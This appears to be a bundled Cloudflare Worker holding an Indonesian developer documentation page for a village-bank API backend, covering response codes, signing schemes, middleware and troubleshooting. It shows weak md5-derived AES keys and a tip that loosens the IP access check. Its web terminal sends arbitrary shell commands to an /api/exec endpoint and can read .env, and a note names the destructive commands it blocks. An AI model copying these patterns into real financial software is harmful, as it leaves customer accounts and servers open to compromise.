          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">ATM Cardless:</h4>
          <table style="margin-bottom:16px">
            <tr><th>Kode</th><th>Arti</th></tr>
            <tr><td><span class="badge badge-green">00</span></td><td>Sukses</td></tr>
            <tr><td><span class="badge badge-red">14</span></td><td>Status rekening tidak valid</td></tr>
            <tr><td><span class="badge badge-red">30</span></td><td>Hash code salah</td></tr>
            <tr><td><span class="badge badge-red">40</span></td><td>IP tidak ada di whitelist</td></tr>
            <tr><td><span class="badge badge-red">61</span></td><td>Saldo tidak cukup</td></tr>
          </table>
          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">SNAP BI:</h4>
          <table>
            <tr><th>Code</th><th>Arti</th></tr>
            <tr><td>2002400/2002500</td><td>Sukses inquiry/payment</td></tr>
            <tr><td>4002400</td><td>Missing mandatory field</td></tr>
            <tr><td>4012400</td><td>Invalid signature</td></tr>
            <tr><td>4012401</td><td>Invalid access token</td></tr>
            <tr><td>4032415</td><td>Rekening tidak aktif</td></tr>
            <tr><td>4092401</td><td>Duplicate reference</td></tr>
            <tr><td>5002500</td><td>General error</td></tr>
          </table>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- SECURITY -->
<section id="section-security" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-shield-alt" style="color:#10b981"></i><h3>Mekanisme Keamanan &amp; Enkripsi</h3></div>
    <div class="card-body">
      <h4 style="font-weight:700;font-size:14px;margin-bottom:12px;color:#1d4ed8">1. AES-256-CBC per Perangkat (iOS)</h4>
      <pre>// Key dibuat saat registrasi, disimpan di gmob_nasabah:
$key = md5($timestamp . $clientID . "KEY");
$iv  = md5($timestamp . $clientID . "IV");
$cs  = md5($timestamp . $clientID . "CS");

// Enkripsi: openssl_encrypt(data, AES-256-CBC, key, RAW, iv) -&gt; base64
// Dekripsi: base64_decode -&gt; openssl_decrypt(...)</pre>

      <h4 style="font-weight:700;font-size:14px;margin-bottom:12px;margin-top:20px;color:#1d4ed8">2. RSA Signature Verifikasi (iosTokenCtrl)</h4>
      <pre>// Saat get access token:
$strToSign = $clientID . "|" . $timestamp;
$isValid = openssl_verify($strToSign, base64_decode($signature),
  config('app.public_key_lpd'), OPENSSL_ALGO_SHA256);
// Public key dimuat dari env PUBLIC_KEY_LPD saat boot</pre>

      <h4 style="font-weight:700;font-size:14px;margin-bottom:12px;margin-top:20px;color:#1d4ed8">3. HMAC-SHA512 (SNAP &amp; mBanking)</h4>
      <pre>// SNAP Transfer VA:
$strToSign = "POST:" . $endpoint . ":" . $token . ":" . sha256(body) . ":" . $timestamp;
$signHash = base64_encode(hash_hmac("sha512", $strToSign, CLIENT_SECRET, true));

// mBanking access:
$strToSign = $partnerID . "|" . $accessToken;
$signHash = base64_encode(hash_hmac("sha512", $strToSign, CLIENT_SECRET));</pre>

      <h4 style="font-weight:700;font-size:14px;margin-bottom:12px;margin-top:20px;color:#1d4ed8">4. SHA-256 Hash Validasi Transfer</h4>
      <pre>// Transfer LPD Inquiry:
SHA-256(fromNorek + toNorek + amount + fromName + toName + remark + BPD_HASHCODE)

// Transfer Bank:
SHA-256(fromNorek + bankCode + toNorek + amount + BPD_HASHCODE)

// ATM:
SHA-256(ATM_HASHCODE + token + accountNo + datetime)</pre>

      <h4 style="font-weight:700;font-size:14px;margin-bottom:12px;margin-top:20px;color:#1d4ed8">5. Whitelist IP per Layanan</h4>
      <table>
        <tr><th>Layanan</th><th>Env Variable</th><th>Middleware</th></tr>
        <tr><td>SNAP BPD</td><td>BPD_STATICIP1..7</td><td>SNAPCheckTransferIn</td></tr>
        <tr><td>Mobile Banking</td><td>BPD_WHITE_LIST + GIO_WHITE_LIST</td><td>iosAccessMdw</td></tr>
        <tr><td>ATM Cardless</td><td>GIO_WHITE_LIST + ATM_WHITE_LIST</td><td>MachineCheck</td></tr>
      </table>

      <h4 style="font-weight:700;font-size:14px;margin-bottom:12px;margin-top:20px;color:#1d4ed8">6. Pembatasan Waktu Layanan</h4>
      <pre>// Di iosAccessMdw::check_access():
// Transfer diblokir: 00:00 - 05:00 (jam 0-4)
// PPOB diblokir:     01:00 - 03:00 (jam 1-2)</pre>
    </div>
  </div>
</section>

<!-- MIDDLEWARE -->
<section id="section-middleware" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-filter" style="color:#7c3aed"></i><h3>Daftar Middleware</h3></div>
    <div class="card-body">
      <table>
        <tr><th>Alias</th><th>Class</th><th>Digunakan Untuk</th><th>Validasi</th></tr>
        <tr><td><span class="inline-code">iosCheckToken</span></td><td>iosTokenMdw</td><td>/smart/access-token</td><td>Signature RSA, client ID, IP</td></tr>
        <tr><td><span class="inline-code">iosCheckAccess</span></td><td>iosAccessMdw</td><td>Semua /smart/*</td><td>Token 3 menit, IP, URL, jam, AES keys</td></tr>
        <tr><td><span class="inline-code">snapTokenIn</span></td><td>SNAPCheckTokenIn</td><td>/v1.0/access-token/b2b</td><td>Field grantType</td></tr>
        <tr><td><span class="inline-code">snapTransferIn</span></td><td>SNAPCheckTransferIn</td><td>/v1.0/transfer-va/*</td><td>HMAC-SHA512, token, IP BPD</td></tr>
        <tr><td><span class="inline-code">machineCheck</span></td><td>MachineCheck</td><td>/cardless/*</td><td>IP whitelist ATM, SHA-256 hash</td></tr>
      </table>
      <div class="info-box info-blue" style="margin-top:16px">
        <i class="fas fa-info-circle"></i>
        <div>
          <strong>Alur iosAccessMdw:</strong>
          <ol style="margin-top:8px;padding-left:16px;line-height:2;font-size:12px">
            <li>Init global params via <span class="inline-code">iosHelper::Gio_SetParam()</span></li>
            <li>Tentukan log path berdasarkan URI</li>
            <li>Insert log request ke file harian (storage/logs/)</li>
            <li>Buat atau ambil AES key/IV/CS dari DB per device</li>
            <li>Ekstrak headers: X-CLIENT-ID, X-TIMESTAMP, X-PARTNER-ID</li>
            <li>Validasi via check_access(): partner, token(3mnt), IP, URL, jam</li>
            <li>Set $_POST['status'] dan $_POST['message']</li>
            <li>Teruskan request ke controller</li>
            <li>Tambahkan CORS headers ke response</li>
          </ol>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- HELPERS -->
<section id="section-helpers" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-tools" style="color:#ea580c"></i><h3>Deskripsi Helper Classes</h3></div>
    <div class="card-body">
      <table>
        <tr><th>Helper</th><th>Ukuran</th><th>Fungsi Utama</th></tr>
        <tr>
          <td><strong>MBankingHelper</strong></td><td>~25KB</td>
          <td>checkAccess() SNAP/mBanking, Gio_PostTransferVA(), enkripsi Gio_Encrypt/Decrypt/Decode(), Gio_InsertIntoFolio/Mutasi(), logging</td>
        </tr>
        <tr>
          <td><strong>MobileHelper</strong></td><td>~16KB</td>
          <td>Check_Register/Login/OTP(), Change_Password/PIN(), ATM_GetToken/ValidToken(), Gio_InsertIntoFolio/Mutasi(), Gio_GetNoReferensi()</td>
        </tr>
        <tr>
          <td><strong>SNAPHelper</strong></td><td>~16KB</td>
          <td>checkTransferVA() validasi SNAP, Gio_PostTransferVA(), log per external ID, Gio_CheckToken(), Gio_GetReferenceVA()</td>
        </tr>
        <tr>
          <td><strong>TabunganHelper</strong></td><td>~14KB</td>
          <td>Check_StatusTabungan/Rekening(), Get_FolioTabungan/Pinjaman/Deposito(), Gio_CheckSaldo/Pin(), GetModulCode(), Gio_InsTransaksiPPOB()</td>
        </tr>
        <tr>
          <td><strong>TransferHelper</strong></td><td>~9KB</td>
          <td>checkTransferIn() (legacy), Gio_GetNasabah() cari by VA, Gio_InqTransferIn/PostTransferIn(), Ins_TransferAR(), logging</td>
        </tr>
        <tr>
          <td><strong>iosHelper</strong></td><td>~14KB</td>
          <td>Gio_CheckToken() 3 menit, Gio_CreateKeyAndIv/GetKeyAndIv(), Gio_Encrypt/Decrypt() AES, Get_DaftarRek(), Gio_GetConfig(), Gio_SetParam()</td>
        </tr>
        <tr>
          <td><strong>iosTransferHelper</strong></td><td>~7KB</td>
          <td>Ins_TransferAR(), Gio_CheckSaldo() + limit, Gio_CheckPIN(), Gio_InsTransferARLog(), Gio_InsTransferVALog(), Get_TransferCost()</td>
        </tr>
      </table>
      <h4 style="font-weight:700;font-size:14px;margin-top:20px;margin-bottom:8px">Modul Rekening (GetModulCode / prefix norek):</h4>
      <table>
        <tr><th>Prefix</th><th>Kode Modul</th><th>Jenis Rekening</th></tr>
        <tr><td>01, 02, 03 (lainnya)</td><td>b</td><td>Tabungan</td></tr>
        <tr><td>10, 11</td><td>e</td><td>Takamas (tabungan khusus)</td></tr>
        <tr><td>20</td><td>f</td><td>Sipura</td></tr>
        <tr><td>30</td><td>g</td><td>Sitirta</td></tr>
        <tr><td>40</td><td>h</td><td>Simapan</td></tr>
        <tr><td>33, 34</td><td>D</td><td>Deposito</td></tr>
      </table>
    </div>
  </div>
</section>

<!-- TROUBLESHOOT -->
<section id="section-troubleshoot" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-bug" style="color:#ef4444"></i><h3>Panduan Troubleshooting</h3></div>
    <div class="card-body">
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#ef4444"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Error: "could not find driver" (SQL Server)</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Install ODBC Driver 17 + ekstensi PHP sqlsrv:
curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add -
sudo ACCEPT_EULA=Y apt-get install msodbcsql17 unixodbc-dev
sudo pecl install sqlsrv pdo_sqlsrv
echo "extension=sqlsrv.so" &gt;&gt; /etc/php/7.4/cli/php.ini</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#ef4444"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Error: file_get_contents() saat boot (config/app.php)</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Penyebab: Path PUBLIC_KEY_LPD / MASTER_BANK_LIST tidak valid
// Pastikan file ada dan .env menggunakan path absolut yang benar:
ls -la /path/to/keys/public_key.pem
chmod 644 keys/public_key.pem</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#d97706"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Warning: Deprecated PHP 8.x</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// SOLUSI: Gunakan PHP 7.4 (sangat disarankan, jangan PHP 8.x)
sudo update-alternatives --config php
# Pilih php7.4</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#d97706"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Error: Composer autoload Helper not found</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Penyebab: case-sensitive path di Linux
// Path di composer.json: "App/Helpers/..." (huruf A besar)
// Path aktual: "app/Helpers/..." (huruf a kecil)
// Solusi: composer dump-autoload --no-scripts</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#d97706"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Error 403: IP tidak dikenal</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Tambahkan IP development ke .env:
GIO_WHITE_LIST=|103.66.86.234|127.0.0.1|YOUR_DEV_IP

// Atau di iosAccessMdw.php check_access():
// Tambahkan kondisi || $noip == "127.0.0.1"</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#3b82f6"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Token selalu expired / invalid</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>// Token valid 3 menit dari pembuatan (iosHelper::Gio_CheckToken)
// Solusi: 
sudo ntpdate -u pool.ntp.org  // Sinkronkan waktu server
// Pastikan ada record di gmob_token yang masih fresh</pre>
        </div>
      </div>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <i class="fas fa-exclamation-circle" style="color:#3b82f6"></i>
          <span style="font-weight:600;font-size:13px;margin-left:8px">Storage / log permission error</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <pre>sudo chmod -R 775 storage/ bootstrap/cache/
sudo chown -R www-data:www-data storage/
mkdir -p storage/logs/{token,transfer-in/inquiry,transfer-in/posting,access,tabungan,transfer-AR,transfer-AB,ppob}</pre>
        </div>
      </div>
    </div>
  </div>
  <div class="card">
    <div class="card-header"><i class="fas fa-file-alt" style="color:#64748b"></i><h3>Lokasi Log Files</h3></div>
    <div class="card-body">
      <table>
        <tr><th>Path Log</th><th>Isi</th></tr>
        <tr><td><span class="inline-code">storage/logs/token/request.log</span></td><td>Log request get access token (harian)</td></tr>
        <tr><td><span class="inline-code">storage/logs/access.txt</span></td><td>Log akses umum iOS (harian)</td></tr>
        <tr><td><span class="inline-code">storage/logs/tabungan.txt</span></td><td>Log request endpoint tabungan</td></tr>
        <tr><td><span class="inline-code">storage/logs/transfer-AR.txt</span></td><td>Log transfer sesama LPD</td></tr>
        <tr><td><span class="inline-code">storage/logs/transfer-AB.txt</span></td><td>Log transfer antar bank</td></tr>
        <tr><td><span class="inline-code">storage/logs/ppob.txt</span></td><td>Log request PPOB</td></tr>
        <tr><td><span class="inline-code">storage/logs/transfer-in/inquiry/</span></td><td>Log SNAP inquiry (per external ID)</td></tr>
        <tr><td><span class="inline-code">storage/logs/transfer-in/posting/</span></td><td>Log SNAP payment (per external ID)</td></tr>
        <tr><td><span class="inline-code">storage/logs/laravel-YYYY-MM-DD.log</span></td><td>Log Laravel standar</td></tr>
      </table>
    </div>
  </div>
</section>


<!-- TERMINAL -->
<section id="section-terminal" class="section">
  <div class="card" style="max-width:900px">
    <div class="card-header" style="background:#0f172a;border-bottom:1px solid #1e293b">
      <i class="fas fa-terminal" style="color:#22d3ee"></i>
      <h3 style="color:#e2e8f0">Terminal Interaktif</h3>
      <span style="margin-left:auto;font-size:11px;color:#64748b">Sandbox: /home/user</span>
      <button onclick="clearTerminal()" title="Clear" style="margin-left:12px;background:#1e293b;border:none;color:#94a3b8;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:12px"><i class="fas fa-eraser"></i></button>
    </div>
    <div style="background:#0f172a;padding:0">
      <!-- Output area -->
      <div id="term-output" style="font-family:'Courier New',monospace;font-size:13px;line-height:1.7;padding:16px;min-height:360px;max-height:520px;overflow-y:auto;color:#e2e8f0;background:#0f172a"></div>
      <!-- Input row -->
      <div style="display:flex;align-items:center;border-top:1px solid #1e293b;padding:10px 16px;background:#0a0f1e;gap:8px">
        <span id="term-prompt" style="color:#22d3ee;font-family:monospace;font-size:13px;white-space:nowrap;flex-shrink:0">user@sandbox:~$</span>
        <input id="term-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
          style="flex:1;background:transparent;border:none;outline:none;color:#f1f5f9;font-family:'Courier New',monospace;font-size:13px;caret-color:#22d3ee"
          placeholder="ketik perintah..."
          onkeydown="termKeyDown(event)"/>
        <button onclick="termRun()" style="background:#1d4ed8;border:none;color:#fff;padding:5px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-weight:600">Run <i class="fas fa-play" style="font-size:10px"></i></button>
      </div>
    </div>
  </div>

  <div class="card" style="max-width:900px;margin-top:16px">
    <div class="card-header"><i class="fas fa-bolt" style="color:#f59e0b"></i><h3>Perintah Cepat</h3></div>
    <div class="card-body" style="display:flex;flex-wrap:wrap;gap:10px">
      <button class="quick-cmd" onclick="quickCmd('php7.4 --version')">php --version</button>
      <button class="quick-cmd" onclick="quickCmd('ls /home/user/webapp/lpd_seminyak')">ls lpd_seminyak/</button>
      <button class="quick-cmd" onclick="quickCmd('cat /home/user/webapp/lpd_seminyak/.env | grep -v PASSWORD | grep -v SECRET | grep -v KEY | head -30')">cat .env (safe)</button>
      <button class="quick-cmd" onclick="quickCmd('php7.4 /home/user/webapp/lpd_seminyak/artisan env')">artisan env</button>
      <button class="quick-cmd" onclick="quickCmd('php7.4 /home/user/webapp/lpd_seminyak/artisan route:list 2>&1 | head -40')">artisan route:list</button>
      <button class="quick-cmd" onclick="quickCmd('composer --version')">composer --version</button>
      <button class="quick-cmd" onclick="quickCmd('ls /home/user/webapp/lpd_seminyak/app/Http/Controllers/')">ls Controllers/</button>
      <button class="quick-cmd" onclick="quickCmd('ls /home/user/webapp/lpd_seminyak/app/Helpers/')">ls Helpers/</button>
      <button class="quick-cmd" onclick="quickCmd('php7.4 -m | grep -E "pdo|sqlsrv|mbstring|openssl"')">php modules</button>
      <button class="quick-cmd" onclick="quickCmd('cat /home/user/webapp/lpd_seminyak/routes/api.php | head -60')">routes/api.php</button>
      <button class="quick-cmd" onclick="quickCmd('du -sh /home/user/webapp/lpd_seminyak/*')">disk usage</button>
      <button class="quick-cmd" onclick="quickCmd('uname -a && cat /etc/os-release | head -5')">system info</button>
    </div>
  </div>

  <div class="info-box info-yellow" style="max-width:900px">
    <i class="fas fa-exclamation-triangle"></i>
    <div><strong>Catatan:</strong> Terminal berjalan di sandbox server. Perintah berbahaya (rm -rf /, fork bomb, dll) diblokir. Timeout 15 detik per perintah.</div>
  </div>
</section>

</div>
</main>

<button class="toggle-btn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>

<style>
.quick-cmd{background:#f1f5f9;border:1px solid #e2e8f0;color:#1e40af;padding:7px 14px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;transition:all .15s;font-family:'Courier New',monospace}
.quick-cmd:hover{background:#dbeafe;border-color:#93c5fd}
.term-line-out{color:#e2e8f0}
.term-line-err{color:#fca5a5}
.term-line-cmd{color:#22d3ee;font-weight:700}
.term-line-info{color:#86efac}
.term-line-cwd{color:#94a3b8;font-size:11px}
</style>

<script>
var termHistory = [];
var termHistIdx = -1;
var termCwd = '/home/user';

function termKeyDown(e) {
  if (e.key === 'Enter') { e.preventDefault(); termRun(); }
  else if (e.key === 'ArrowUp') { e.preventDefault(); if (termHistIdx < termHistory.length-1) { termHistIdx++; document.getElementById('term-input').value = termHistory[termHistIdx] || ''; } }
  else if (e.key === 'ArrowDown') { e.preventDefault(); if (termHistIdx > 0) { termHistIdx--; document.getElementById('term-input').value = termHistory[termHistIdx] || ''; } else { termHistIdx=-1; document.getElementById('term-input').value=''; } }
}

function termRun() {
  var input = document.getElementById('term-input');
  var cmd = input.value.trim();
  if (!cmd) return;
  input.value = '';
  termHistIdx = -1;
  termHistory.unshift(cmd);
  if (termHistory.length > 100) termHistory.pop();
  appendTermLine('$ ' + cmd, 'term-line-cmd');
  setTermBusy(true);
  fetch('/api/exec', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ command: cmd, workdir: termCwd })
  })
  .then(function(r){ return r.json(); })
  .then(function(d){
    var NL = String.fromCharCode(10);
    if (d.stdout && d.stdout.trim()) d.stdout.trim().split(NL).forEach(function(l){ appendTermLine(l,'term-line-out'); });
    if (d.stderr && d.stderr.trim()) d.stderr.trim().split(NL).forEach(function(l){ appendTermLine(l,'term-line-err'); });
    if (d.cwd && d.cwd !== termCwd) {
      termCwd = d.cwd;
      updatePrompt();
    }
    if (!d.stdout && !d.stderr && d.exitCode === 0) appendTermLine('(perintah selesai, tidak ada output)','term-line-info');
    setTermBusy(false);
    scrollTermBottom();
  })
  .catch(function(err){
    appendTermLine('Error: ' + err.message, 'term-line-err');
    setTermBusy(false);
    scrollTermBottom();
  });
}

function quickCmd(cmd) {
  showSection('terminal');
  document.getElementById('term-input').value = cmd;
  document.getElementById('term-input').focus();
  setTimeout(termRun, 100);
}

function appendTermLine(text, cls) {
  var out = document.getElementById('term-output');
  var line = document.createElement('div');
  line.className = cls || 'term-line-out';
  line.textContent = text;
  out.appendChild(line);
}

function scrollTermBottom() {
  var out = document.getElementById('term-output');
  out.scrollTop = out.scrollHeight;
}

function clearTerminal() {
  document.getElementById('term-output').innerHTML = '';
  appendTermLine('Terminal dibersihkan. Ketik perintah di bawah.', 'term-line-info');
}

function setTermBusy(busy) {
  var btn = document.querySelector('#section-terminal button[onclick="termRun()"]');
  var inp = document.getElementById('term-input');
  if (btn) btn.disabled = busy;
  if (inp) inp.disabled = busy;
  if (busy) appendTermLine('\u23F3 menjalankan...', 'term-line-info');
}

function updatePrompt() {
  var short = termCwd.replace('/home/user', '~');
  document.getElementById('term-prompt').textContent = 'user@sandbox:' + short + '$';
}

// Inisialisasi terminal
(function initTerminal() {
  fetch('/api/exec/health').then(function(r){return r.json();}).then(function(d){
    if (d.ok) {
      termCwd = d.cwd || '/home/user';
      updatePrompt();
      appendTermLine('\u2705 Terminal siap. Server berjalan di sandbox.', 'term-line-info');
      appendTermLine('\u{1F4A1} Ketik perintah Linux atau klik tombol Perintah Cepat di bawah.', 'term-line-info');
    } else {
      appendTermLine('\u26A0\uFE0F  Terminal server offline. Coba muat ulang halaman.', 'term-line-err');
    }
  }).catch(function(){
    appendTermLine('\u26A0\uFE0F  Tidak dapat terhubung ke terminal server.', 'term-line-err');
  });
})();
<\/script>

<script>
function showSection(name) {
  document.querySelectorAll('.section').forEach(function(s){s.classList.remove('active')});
  document.querySelectorAll('#sidebar nav a').forEach(function(a){a.classList.remove('active')});
  var sec = document.getElementById('section-' + name);
  if (sec) sec.classList.add('active');
  var nav = document.getElementById('nav-' + name);
  if (nav) nav.classList.add('active');
  var titles = {
    'overview': 'Beranda & Ringkasan',
    'architecture': 'Arsitektur Sistem',
    'install': 'Panduan Instalasi',
    'config': 'Konfigurasi .env',
    'auth': 'Autentikasi & Token',
    'ios-access': 'iOS \u2013 Login & Register',
    'ios-tabungan': 'iOS \u2013 Tabungan',
    'ios-transfer-lpd': 'iOS \u2013 Transfer LPD',
    'ios-transfer-bank': 'iOS \u2013 Transfer Antar Bank',
    'ios-ppob': 'iOS \u2013 PPOB',
    'snap': 'SNAP \u2013 Transfer VA BPD',
    'atm': 'ATM Cardless',
    'ppob-callback': 'PPOB Callback',
    'database': 'Skema Database',
    'response-codes': 'Kode Respons',
    'security': 'Keamanan & Enkripsi',
    'middleware': 'Middleware & Guard',
    'helpers': 'Helper Classes',
    'troubleshoot': 'Troubleshooting',
    'terminal': 'Terminal Interaktif'
  };
  document.getElementById('page-title').innerHTML = '<i class="fas fa-book mr-2" style="color:#2563eb"></i>' + (titles[name] || name);
  window.scrollTo(0,0);
}
function toggleEndpoint(header) {
  var body = header.nextElementSibling;
  body.classList.toggle('hidden');
  var icon = header.querySelector('.fa-chevron-down,.fa-chevron-up');
  if (icon) { icon.classList.toggle('fa-chevron-down'); icon.classList.toggle('fa-chevron-up'); }
}
function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
<\/script>
</body>
</html>`;
}
__name(ts, "ts");
var bt = new Ht();
var as = Object.assign({ "/src/index.tsx": K });
var Gt = false;
for (const [, e] of Object.entries(as)) e && (bt.all("*", (t) => {
  let s;
  try {
    s = t.executionCtx;
  } catch {
  }
  return e.fetch(t.req.raw, t.env, s);
}), bt.notFound((t) => {
  let s;
  try {
    s = t.executionCtx;
  } catch {
  }
  return e.fetch(t.req.raw, t.env, s);
}), Gt = true);
if (!Gt) throw new Error("Can't import modules from ['/src/index.ts','/src/index.tsx','/app/server.ts']");

// ../node_modules/wrangler/templates/middleware/middleware-ensure-req-body-drained.ts
var drainBody = /* @__PURE__ */ __name(async (request, env2, _ctx, middlewareCtx) => {
  try {
    return await middlewareCtx.next(request, env2);
  } finally {
    try {
      if (request.body !== null && !request.bodyUsed) {
        const reader = request.body.getReader();
        while (!(await reader.read()).done) {
        }
      }
    } catch (e) {
      console.error("Failed to drain the unused request body.", e);
    }
  }
}, "drainBody");
var middleware_ensure_req_body_drained_default = drainBody;

// ../node_modules/wrangler/templates/middleware/middleware-miniflare3-json-error.ts
function reduceError(e) {
  return {
    name: e?.name,
    message: e?.message ?? String(e),
    stack: e?.stack,
    cause: e?.cause === void 0 ? void 0 : reduceError(e.cause)
  };
}
__name(reduceError, "reduceError");
var jsonError = /* @__PURE__ */ __name(async (request, env2, _ctx, middlewareCtx) => {
  try {
    return await middlewareCtx.next(request, env2);
  } catch (e) {
    const error3 = reduceError(e);
    return Response.json(error3, {
      status: 500,
      headers: { "MF-Experimental-Error-Stack": "true" }
    });
  }
}, "jsonError");
var middleware_miniflare3_json_error_default = jsonError;

// ../.wrangler/tmp/bundle-6f08QR/middleware-insertion-facade.js
var __INTERNAL_WRANGLER_MIDDLEWARE__ = [
  middleware_ensure_req_body_drained_default,
  middleware_miniflare3_json_error_default
];
var middleware_insertion_facade_default = bt;

// ../node_modules/wrangler/templates/middleware/common.ts
var __facade_middleware__ = [];
function __facade_register__(...args) {
  __facade_middleware__.push(...args.flat());
}
__name(__facade_register__, "__facade_register__");
function __facade_invokeChain__(request, env2, ctx, dispatch, middlewareChain) {
  const [head, ...tail] = middlewareChain;
  const middlewareCtx = {
    dispatch,
    next(newRequest, newEnv) {
      return __facade_invokeChain__(newRequest, newEnv, ctx, dispatch, tail);
    }
  };
  return head(request, env2, ctx, middlewareCtx);
}
__name(__facade_invokeChain__, "__facade_invokeChain__");
function __facade_invoke__(request, env2, ctx, dispatch, finalMiddleware) {
  return __facade_invokeChain__(request, env2, ctx, dispatch, [
    ...__facade_middleware__,
    finalMiddleware
  ]);
}
__name(__facade_invoke__, "__facade_invoke__");

// ../.wrangler/tmp/bundle-6f08QR/middleware-loader.entry.ts
var __Facade_ScheduledController__ = class ___Facade_ScheduledController__ {
  constructor(scheduledTime, cron, noRetry) {
    this.scheduledTime = scheduledTime;
    this.cron = cron;
    this.#noRetry = noRetry;
  }
  static {
    __name(this, "__Facade_ScheduledController__");
  }
  #noRetry;
  noRetry() {
    if (!(this instanceof ___Facade_ScheduledController__)) {
      throw new TypeError("Illegal invocation");
    }
    this.#noRetry();
  }
};
function wrapExportedHandler(worker) {
  if (__INTERNAL_WRANGLER_MIDDLEWARE__ === void 0 || __INTERNAL_WRANGLER_MIDDLEWARE__.length === 0) {
    return worker;
  }
  for (const middleware of __INTERNAL_WRANGLER_MIDDLEWARE__) {
    __facade_register__(middleware);
  }
  const fetchDispatcher = /* @__PURE__ */ __name(function(request, env2, ctx) {
    if (worker.fetch === void 0) {
      throw new Error("Handler does not export a fetch() function.");
    }
    return worker.fetch(request, env2, ctx);
  }, "fetchDispatcher");
  return {
    ...worker,
    fetch(request, env2, ctx) {
      const dispatcher = /* @__PURE__ */ __name(function(type, init) {
        if (type === "scheduled" && worker.scheduled !== void 0) {
          const controller = new __Facade_ScheduledController__(
            Date.now(),
            init.cron ?? "",
            () => {
            }
          );
          return worker.scheduled(controller, env2, ctx);
        }
      }, "dispatcher");
      return __facade_invoke__(request, env2, ctx, dispatcher, fetchDispatcher);
    }
  };
}
__name(wrapExportedHandler, "wrapExportedHandler");
function wrapWorkerEntrypoint(klass) {
  if (__INTERNAL_WRANGLER_MIDDLEWARE__ === void 0 || __INTERNAL_WRANGLER_MIDDLEWARE__.length === 0) {
    return klass;
  }
  for (const middleware of __INTERNAL_WRANGLER_MIDDLEWARE__) {
    __facade_register__(middleware);
  }
  return class extends klass {
    #fetchDispatcher = /* @__PURE__ */ __name((request, env2, ctx) => {
      this.env = env2;
      this.ctx = ctx;
      if (super.fetch === void 0) {
        throw new Error("Entrypoint class does not define a fetch() function.");
      }
      return super.fetch(request);
    }, "#fetchDispatcher");
    #dispatcher = /* @__PURE__ */ __name((type, init) => {
      if (type === "scheduled" && super.scheduled !== void 0) {
        const controller = new __Facade_ScheduledController__(
          Date.now(),
          init.cron ?? "",
          () => {
          }
        );
        return super.scheduled(controller);
      }
    }, "#dispatcher");
    fetch(request) {
      return __facade_invoke__(
        request,
        this.env,
        this.ctx,
        this.#dispatcher,
        this.#fetchDispatcher
      );
    }
  };
}
__name(wrapWorkerEntrypoint, "wrapWorkerEntrypoint");
var WRAPPED_ENTRY;
if (typeof middleware_insertion_facade_default === "object") {
  WRAPPED_ENTRY = wrapExportedHandler(middleware_insertion_facade_default);
} else if (typeof middleware_insertion_facade_default === "function") {
  WRAPPED_ENTRY = wrapWorkerEntrypoint(middleware_insertion_facade_default);
}
var middleware_loader_entry_default = WRAPPED_ENTRY;
export {
  __INTERNAL_WRANGLER_MIDDLEWARE__,
  middleware_loader_entry_default as default
};
//# sourceMappingURL=bundledWorker-0.022146588280185675.mjs.map
